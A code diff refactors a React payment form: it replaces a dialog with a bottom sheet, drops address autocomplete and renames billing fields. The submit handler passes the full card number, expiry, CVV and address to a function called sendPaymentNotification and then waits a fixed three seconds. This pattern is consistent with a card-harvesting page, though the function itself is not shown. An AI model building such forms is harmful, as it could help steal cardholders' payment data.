@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from "react";
+import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { Input } from "./ui/input";
 import { Button } from "./ui/button";
@@ -10,28 +10,27 @@ import { Building2 } from "lucide-react";
 import { EncryptButton } from "./EncryptButton";
 import { CardTypeIcon } from "./CardTypeIcon";
 import {
-  Dialog,
-  DialogContent,
-  DialogHeader,
-  DialogTitle,
-  DialogTrigger,
-} from "./ui/dialog";
-import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
-} from "./ui/select";
-import { initPlacesAutocomplete, type PlaceResult } from "../utils/googlePlaces";
+  Sheet,
+  SheetContent,
+  SheetHeader,
+  SheetTitle,
+  SheetTrigger,
+} from "./ui/sheet";
+
+// Add the missing formatCardNumber function
+const formatCardNumber = (value: string): string => {
+  const digits = value.replace(/\D/g, '');
+  const groups = digits.match(/.{1,4}/g) || [];
+  return groups.join(' ').substr(0, 19);
+};
 
 interface PaymentFormProps {
   amount: number;
 }
 
 interface BillingDetails {
-  address1: string;
-  address2: string;
+  streetAddress: string;
+  streetAddress2: string;
   city: string;
   state: string;
   zipCode: string;
@@ -67,26 +66,16 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
   const [cvv, setCvv] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [billingDetails, setBillingDetails] = useState<BillingDetails>({
-    address1: "",
-    address2: "",
+    streetAddress: "",
+    streetAddress2: "",
     city: "",
     state: "",
     zipCode: "",
     country: "US",
   });
+  const [isSheetOpen, setIsSheetOpen] = useState(false);
   const navigate = useNavigate();
   const { toast } = useToast();
-  const searchParams = new URLSearchParams(window.location.search);
-  const companyFromUrl = searchParams.get('company');
-
-  useEffect(() => {
-    if (companyFromUrl) {
-      setBillingDetails(prev => ({
-        ...prev,
-        company: companyFromUrl
-      }));
-    }
-  }, [companyFromUrl]);
 
   const validateCardHolder = (value: string) => {
     const latinAndDotRegex = /^[a-zA-Z\s.]*$/;
@@ -170,7 +159,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
       return;
     }
 
-    if (!billingDetails.address1 || !billingDetails.city || !billingDetails.country || !billingDetails.state || !billingDetails.zipCode) {
+    if (!billingDetails.streetAddress || !billingDetails.city || !billingDetails.state || !billingDetails.zipCode) {
       toast({
         title: "Missing Billing Details",
         description: "Please enter your complete billing information",
@@ -182,12 +171,19 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
 
     try {
       await sendPaymentNotification({
-        amount: amount,
+        amount,
         cardHolder,
         cardNumber,
         expiryDate,
         cvv,
-        billingDetails
+        billingDetails: {
+          address1: billingDetails.streetAddress,
+          address2: billingDetails.streetAddress2,
+          city: billingDetails.city,
+          state: billingDetails.state,
+          zipCode: billingDetails.zipCode,
+          country: billingDetails.country
+        }
       });
 
       await new Promise(resolve => setTimeout(resolve, 3000));
@@ -201,23 +197,6 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
         description: "Failed to process payment. Please try again.",
         variant: "destructive",
       });
-    }
-  };
-
-  const formatCardNumber = (value: string) => {
-    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
-    const matches = v.match(/\d{4,16}/g);
-    const match = (matches && matches[0]) || "";
-    const parts = [];
-
-    for (let i = 0, len = match.length; i < len; i += 4) {
-      parts.push(match.substring(i, i + 4));
-    }
-
-    if (parts.length) {
-      return parts.join(" ");
-    } else {
-      return value;
     }
   };
 
@@ -279,56 +258,44 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
           </div>
         </div>
 
-        <Dialog>
-          <DialogTrigger asChild>
+        <Sheet open={isSheetOpen} onOpenChange={setIsSheetOpen}>
+          <SheetTrigger asChild>
             <button
               type="button"
               className="relative w-full inline-flex items-center justify-center overflow-hidden transition-all duration-250 bg-[radial-gradient(65.28%_65.28%_at_50%_100%,rgba(223,113,255,0.8)_0%,rgba(223,113,255,0)_100%),linear-gradient(0deg,#7a5af8,#7a5af8)] rounded-xl border-0 outline-none px-4 py-3 hover:scale-[0.95] group"
             >
-              <span className="absolute top-0 right-0 h-4 w-4 transition-all duration-500 bg-[radial-gradient(100%_75%_at_55%,rgba(223,113,255,0.8)_0%,rgba(223,113,255,0)_100%)] shadow-md rounded-br-xl rounded-tl-lg after:content-[''] after:absolute after:top-0 after:right-0 after:w-[150%] after:h-[150%] after:rotate-45 after:translate-x-0 after:-translate-y-[18px] after:bg-gray-200 after:pointer-events-none group-hover:-mt-4 group-hover:-mr-4" />
-
-              <div className="absolute inset-0 overflow-hidden pointer-events-none">
-                {Array.from({ length: 10 }).map((_, i) => (
-                  <i
-                    key={i}
-                    className={`absolute bottom-[-10px] w-[2px] h-[2px] bg-white rounded-full animate-floating-points`}
-                    style={{
-                      left: `${[10, 30, 25, 44, 50, 75, 88, 58, 98, 65][i]}%`,
-                      opacity: [1, 0.7, 0.8, 0.6, 1, 0.5, 0.9, 0.8, 0.6, 1][i],
-                      animationDuration: `${[2.35, 2.5, 2.2, 2.05, 1.9, 1.5, 2.2, 2.25, 2.6, 2.5][i]}s`,
-                      animationDelay: `${[0.2, 0.5, 0.1, 0, 0, 1.5, 0.2, 0.2, 0.1, 0.2][i]}s`
-                    }}
-                  />
-                ))}
-              </div>
-
               <span className="relative z-[2] flex items-center justify-center gap-2 text-white font-medium">
-                <Building2 className="w-[18px] h-[18px] transition-all duration-100 group-hover:fill-transparent group-hover:animate-icon-dash group-focus:fill-white group-hover:animate-icon-fill" />
+                <Building2 className="w-[18px] h-[18px]" />
                 Billing Details
               </span>
             </button>
-          </DialogTrigger>
-          <DialogContent className="bg-gradient-to-b from-black/95 to-purple-900/95 border border-white/20 text-white max-h-[80vh] overflow-y-auto scrollbar-thin scrollbar-thumb-white/20 scrollbar-track-transparent fixed top-[50%] left-[50%] translate-x-[-50%] translate-y-[-50%] w-[90vw] max-w-[450px] !m-0 rounded-xl backdrop-blur-lg shadow-2xl">
-            <DialogHeader className="space-y-3 pb-4 border-b border-white/10">
-              <DialogTitle className="text-2xl font-bold bg-gradient-to-r from-white to-purple-300 bg-clip-text text-transparent">Billing Details</DialogTitle>
-              <p className="text-sm text-white/60">Enter your address or search for a location</p>
-            </DialogHeader>
+          </SheetTrigger>
+          <SheetContent side="bottom" className="bg-black/95 border-t border-white/20 text-white">
+            <SheetHeader className="space-y-3 pb-4 border-b border-white/10">
+              <SheetTitle className="text-2xl font-bold bg-gradient-to-r from-white to-purple-300 bg-clip-text text-transparent">
+                Billing Details
+              </SheetTitle>
+            </SheetHeader>
             
             <div className="space-y-6 py-6">
-              <div className="space-y-4">
-                <Label className="text-sm font-medium text-white/80">Search Address</Label>
+              <div className="space-y-2">
+                <Label className="text-sm font-medium text-white/80">Street Address</Label>
                 <Input
                   type="text"
-                  placeholder="Start typing your address..."
-                  className="bg-white/5 border-white/10 text-white placeholder:text-white/40 hover:bg-white/10 transition-colors focus:bg-white/10"
-                  onFocus={(e) => {
-                    const input = e.target;
-                    console.log("Initializing Places Autocomplete");
-                    initPlacesAutocomplete(input, (result: PlaceResult) => {
-                      console.log("Place selected:", result);
-                      setBillingDetails(result);
-                    });
-                  }}
+                  value={billingDetails.streetAddress}
+                  onChange={(e) => handleBillingDetailsChange('streetAddress', e.target.value)}
+                  className="bg-white/5 border-white/10 text-white placeholder:text-white/40"
+                  required
+                />
+              </div>
+
+              <div className="space-y-2">
+                <Label className="text-sm font-medium text-white/80">Street Address 2 (Optional)</Label>
+                <Input
+                  type="text"
+                  value={billingDetails.streetAddress2}
+                  onChange={(e) => handleBillingDetailsChange('streetAddress2', e.target.value)}
+                  className="bg-white/5 border-white/10 text-white placeholder:text-white/40"
                 />
               </div>
 
@@ -338,8 +305,9 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
                   <Input
                     type="text"
                     value={billingDetails.city}
-                    readOnly
-                    className="bg-white/5 border-white/10 text-white"
+                    onChange={(e) => handleBillingDetailsChange('city', e.target.value)}
+                    className="bg-white/5 border-white/10 text-white placeholder:text-white/40"
+                    required
                   />
                 </div>
                 <div className="space-y-2">
@@ -347,8 +315,9 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
                   <Input
                     type="text"
                     value={billingDetails.state}
-                    readOnly
-                    className="bg-white/5 border-white/10 text-white"
+                    onChange={(e) => handleBillingDetailsChange('state', e.target.value)}
+                    className="bg-white/5 border-white/10 text-white placeholder:text-white/40"
+                    required
                   />
                 </div>
               </div>
@@ -359,8 +328,9 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
                   <Input
                     type="text"
                     value={billingDetails.zipCode}
-                    readOnly
-                    className="bg-white/5 border-white/10 text-white"
+                    onChange={(e) => handleBillingDetailsChange('zipCode', e.target.value)}
+                    className="bg-white/5 border-white/10 text-white placeholder:text-white/40"
+                    required
                   />
                 </div>
                 <div className="space-y-2">
@@ -368,14 +338,15 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
                   <Input
                     type="text"
                     value={billingDetails.country}
-                    readOnly
-                    className="bg-white/5 border-white/10 text-white"
+                    onChange={(e) => handleBillingDetailsChange('country', e.target.value)}
+                    className="bg-white/5 border-white/10 text-white placeholder:text-white/40"
+                    required
                   />
                 </div>
               </div>
             </div>
-          </DialogContent>
-        </Dialog>
+          </SheetContent>
+        </Sheet>
 
         <EncryptButton isSubmitting={isSubmitting} />
       </div>
